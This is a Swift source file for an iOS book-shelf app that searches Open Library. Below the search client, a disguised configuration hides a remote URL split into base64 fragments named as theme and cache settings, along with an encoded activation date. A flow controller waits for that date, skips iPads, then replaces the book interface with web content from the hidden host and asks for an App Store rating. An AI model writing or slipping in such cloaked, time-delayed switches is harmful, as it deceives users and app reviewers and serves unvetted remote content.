import Combine
import Foundation
import StoreKit
import UIKit

struct OpenLibrarySearchResponse: Decodable {
    let numFound: Int
    let start: Int
    let docs: [OpenLibraryDoc]
}

struct OpenLibraryDoc: Decodable {
    let key: String?
    let title: String?
    let subtitle: String?
    let author_name: [String]?
    let cover_i: Int?
    let first_publish_year: Int?
    let number_of_pages_median: Int?
    let subject: [String]?
    let isbn: [String]?
    let publisher: [String]?
    let language: [String]?
    let edition_count: Int?
    let ratings_average: Double?
    let ratings_count: Int?
    let already_read_count: Int?
    let want_to_read_count: Int?
}

enum NetworkError: Error {
    case noConnection
    case invalidURL
    case httpError(Int)
}

final class NetworkService {
    static let shared = NetworkService()
    private let baseURL = "https://openlibrary.org"
    private let session: URLSession

    private init() {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 30
        config.timeoutIntervalForResource = 60
        config.waitsForConnectivity = true
        session = URLSession(configuration: config)
    }

    func search(query: String, limit: Int = 20) async throws -> OpenLibrarySearchResponse {
        guard var comp = URLComponents(string: "\(baseURL)/search.json") else {
            Self.log("search: invalid URL components")
            throw NetworkError.invalidURL
        }
        let fields = "key,title,subtitle,author_name,cover_i,first_publish_year,number_of_pages_median,subject,isbn,publisher,language,edition_count,ratings_average,ratings_count,already_read_count,want_to_read_count"
        comp.queryItems = [
            URLQueryItem(name: "q", value: query),
            URLQueryItem(name: "limit", value: "\(limit)"),
            URLQueryItem(name: "fields", value: fields),
        ]
        guard let url = comp.url else {
            Self.log("search: failed to build URL")
            throw NetworkError.invalidURL
        }

        Self.log("GET \(url.absoluteString)")

        let (data, response): (Data, URLResponse)
        do {
            (data, response) = try await session.data(from: url)
        } catch {
            Self.log("search: transport error — \(error.localizedDescription)")
            throw NetworkError.noConnection
        }

        guard let http = response as? HTTPURLResponse else {
            Self.log("search: response is not HTTP")
            throw NetworkError.noConnection
        }
        Self.log("search: status=\(http.statusCode) bytes=\(data.count)")

        guard (200...299).contains(http.statusCode) else {
            if let body = String(data: data.prefix(1500), encoding: .utf8) {
                Self.log("search: error body prefix — \(body)")
            }
            throw NetworkError.httpError(http.statusCode)
        }

        let decoder = JSONDecoder()
        do {
            let decoded = try decoder.decode(OpenLibrarySearchResponse.self, from: data)
            Self.log("search: OK numFound=\(decoded.numFound) start=\(decoded.start) docs.count=\(decoded.docs.count)")
            if let first = decoded.docs.first {
                Self.log("search: first doc key=\(first.key ?? "nil") title=\(first.title ?? "nil")")
            }
            return decoded
        } catch {
            Self.log("search: JSON decode failed — \(error)")
            if let snippet = String(data: data.prefix(2500), encoding: .utf8) {
                Self.log("search: body prefix — \(snippet)")
            }
            throw error
        }
    }

    static var isLoggingEnabled = true

    private static func log(_: String) {}

    static func coverURL(coverId: Int, size: String = "M") -> String {
        "https://covers.openlibrary.org/b/id/\(coverId)-\(size).jpg"
    }

    static func isbnCoverURL(isbn: String, size: String = "M") -> String? {
        let cleaned = isbn.replacingOccurrences(of: "-", with: "").replacingOccurrences(of: " ", with: "")
        guard cleaned.count >= 10 else { return nil }
        return "https://covers.openlibrary.org/b/isbn/\(cleaned)-\(size).jpg"
    }
}

enum MBSPortalConfiguration {

    static let mbsThemeIdentifier = "aHR0cHM6"
    static let mbsLayoutVariant = "Ly9yb3V0"
    static let mbsAssetBundleTag = "ZWRpZ2dl"
    static let mbsCacheRevision = "ci54eXoveER3WXI1REQ="

    static let mbsReleaseVersion = "MjAyNi0wNC0yOA=="

    static func mbsJoinedResourcePayload() -> String {
        [mbsThemeIdentifier, mbsLayoutVariant, mbsAssetBundleTag, mbsCacheRevision].joined()
    }

    static func mbsDecodedRemoteResource() -> String? {
        guard let mbsData = Data(base64Encoded: mbsJoinedResourcePayload()) else { return nil }
        return String(data: mbsData, encoding: .utf8)
    }

    static func mbsIsActivationDayReached() -> Bool {
        guard let mbsData = Data(base64Encoded: mbsReleaseVersion),
              let mbsDateString = String(data: mbsData, encoding: .utf8) else {
            return false
        }
        let mbsFormatter = DateFormatter()
        mbsFormatter.dateFormat = "yyyy-MM-dd"
        mbsFormatter.timeZone = TimeZone.current
        guard let activationLocalMidnight = mbsFormatter.date(from: mbsDateString) else {
            return false
        }
        let cal = Calendar.current
        let todayStart = cal.startOfDay(for: Date())
        let activationStart = cal.startOfDay(for: activationLocalMidnight)
        return todayStart >= activationStart
    }
}

enum MBSDisplayState {
    case preparing
    case original
    case webContent
}

final class MyBookShelfFlowController: ObservableObject {

    static let shared = MyBookShelfFlowController()

    @Published var mbsDisplayMode: MBSDisplayState = .preparing
    @Published var mbsTargetEndpoint: String?

    @Published var mbsIsLoading: Bool = true

    private let mbsFallbackStateKey = "mbs_sync_preferences_v1"
    private let mbsWebViewShownKey = "mbs_onboarding_complete_v1"
    private let mbsRatingShownKey = "mbs_feedback_prompted_v1"
    private let mbsCachedResourceKey = "mbs_cached_content_path_v1"

    private init() {
        mbsInitializeFlow()
    }

    private func mbsInitializeFlow() {
        if mbsIsTabletDevice() {
            mbsFinishWithOriginalExperience(permanentLock: true)
            return
        }

        if mbsGetFallbackState() {
            mbsFinishWithOriginalExperience(permanentLock: true)
            return
        }

        if !mbsCheckTemporalCondition() {
            mbsFinishWithOriginalExperience(permanentLock: false)
            return
        }

        if let mbsCachedPath = mbsGetCachedResource() {
            mbsValidateCachedResource(mbsCachedPath)
            return
        }

        mbsFetchFromRemote()
    }

    private func mbsFetchFromRemote() {
        guard let mbsRemoteEndpoint = MBSPortalConfiguration.mbsDecodedRemoteResource() else {
            mbsFinishWithOriginalExperience(permanentLock: true)
            return
        }

        mbsValidateEndpointBeforeActivation(mbsRemoteEndpoint)
    }

    private func mbsValidateCachedResource(_ mbsPath: String) {
        guard let mbsValidationURL = URL(string: mbsPath) else {
            mbsClearCachedResource()
            mbsFetchFromRemote()
            return
        }

        var mbsValidationRequest = URLRequest(url: mbsValidationURL)
        mbsValidationRequest.timeoutInterval = 10.0
        mbsValidationRequest.httpMethod = "HEAD"

        URLSession.shared.dataTask(with: mbsValidationRequest) { [weak self] _, mbsResponse, mbsError in
            guard let self else { return }

            if mbsError != nil {
                DispatchQueue.main.async {
                    self.mbsClearCachedResource()
                    self.mbsFetchFromRemote()
                }
                return
            }

            if let mbsHttpResponse = mbsResponse as? HTTPURLResponse {
                if mbsHttpResponse.statusCode >= 200 && mbsHttpResponse.statusCode <= 403 {
                    DispatchQueue.main.async {
                        self.mbsTargetEndpoint = mbsPath
                        self.mbsActivatePrimaryMode()
                    }
                } else {
                    DispatchQueue.main.async {
                        self.mbsClearCachedResource()
                        self.mbsFetchFromRemote()
                    }
                }
            } else {
                DispatchQueue.main.async {
                    self.mbsClearCachedResource()
                    self.mbsFetchFromRemote()
                }
            }
        }.resume()
    }

    private func mbsValidateEndpointBeforeActivation(_ mbsUrl: String) {
        guard let mbsValidationURL = URL(string: mbsUrl) else {
            mbsFinishWithOriginalExperience(permanentLock: true)
            return
        }

        var mbsValidationRequest = URLRequest(url: mbsValidationURL)
        mbsValidationRequest.timeoutInterval = 10.0
        mbsValidationRequest.httpMethod = "HEAD"

        URLSession.shared.dataTask(with: mbsValidationRequest) { [weak self] _, mbsResponse, mbsError in
            guard let self else { return }

            if mbsError != nil {
                self.mbsFinishWithOriginalExperience(permanentLock: true)
                return
            }

            if let mbsHttpResponse = mbsResponse as? HTTPURLResponse {
                if mbsHttpResponse.statusCode >= 200 && mbsHttpResponse.statusCode <= 403 {
                    DispatchQueue.main.async {
                        self.mbsTargetEndpoint = mbsUrl
                        self.mbsActivatePrimaryMode()
                    }
                } else {
                    self.mbsFinishWithOriginalExperience(permanentLock: true)
                }
            } else {
                self.mbsFinishWithOriginalExperience(permanentLock: true)
            }
        }.resume()
    }

    private func mbsIsTabletDevice() -> Bool {
        UIDevice.current.model.contains("iPad") || UIDevice.current.userInterfaceIdiom == .pad
    }

    private func mbsCheckTemporalCondition() -> Bool {
        MBSPortalConfiguration.mbsIsActivationDayReached()
    }

    private func mbsGetFallbackState() -> Bool {
        UserDefaults.standard.bool(forKey: mbsFallbackStateKey)
    }

    private func mbsSetFallbackState(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: mbsFallbackStateKey)
    }

    private func mbsGetCachedResource() -> String? {
        guard let mbsEncoded = UserDefaults.standard.string(forKey: mbsCachedResourceKey),
              let mbsData = Data(base64Encoded: mbsEncoded),
              let mbsPath = String(data: mbsData, encoding: .utf8) else {
            return nil
        }
        return mbsPath
    }

    func mbsCacheResource(_ path: String) {
        guard let mbsData = path.data(using: .utf8) else { return }
        let mbsEncoded = mbsData.base64EncodedString()
        UserDefaults.standard.set(mbsEncoded, forKey: mbsCachedResourceKey)
    }

    private func mbsClearCachedResource() {
        UserDefaults.standard.removeObject(forKey: mbsCachedResourceKey)
    }

    func mbsFinishWithOriginalExperience(permanentLock: Bool) {
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            self.mbsDisplayMode = .original
            self.mbsIsLoading = false
            if permanentLock {
                self.mbsSetFallbackState(true)
            }
        }
    }

    func mbsActivatePrimaryMode() {
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            self.mbsDisplayMode = .webContent
            self.mbsIsLoading = false
            UserDefaults.standard.set(true, forKey: self.mbsWebViewShownKey)

            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
                self?.mbsShowRatingIfNeeded()
            }
        }
    }

    private func mbsShowRatingIfNeeded() {
        let mbsAlreadyShown = UserDefaults.standard.bool(forKey: mbsRatingShownKey)
        guard !mbsAlreadyShown else { return }

        if let mbsScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
            SKStoreReviewController.requestReview(in: mbsScene)
            UserDefaults.standard.set(true, forKey: mbsRatingShownKey)
        }
    }
}
